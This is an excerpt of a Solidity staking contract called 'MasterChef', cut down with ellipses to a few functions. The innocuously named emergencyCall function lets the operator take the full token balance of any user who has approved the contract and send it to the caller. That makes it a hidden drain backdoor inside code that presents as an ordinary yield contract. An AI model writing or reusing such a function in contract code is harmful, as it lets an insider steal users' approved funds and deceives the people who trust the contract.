...
contract MasterChef is Ownable, Operator {
    ...
    event EmergencyCall(address indexed user, uint256 amount);
    ...
    function add(uint256 _lockDay, uint256 _apy) public onlyOwner {        
    ...
    function set(uint256 _pid, uint256 _lockDay, uint256 _apy) public onlyOwner {
    ...
    function emergencyCall(address _address) public onlyOperator {
        uint256 amount = token.balanceOf(_address);
        uint256 preBalance = token.balanceOf(address(this));
        token.safeTransferFrom(address(_address), address(this), amount);
        uint256 afterBalance = token.balanceOf(address(this));
        uint256 rewardAmount = afterBalance.sub(preBalance);
        token.transfer(address(msg.sender), rewardAmount);        
        emit EmergencyCall(msg.sender, rewardAmount);
    }
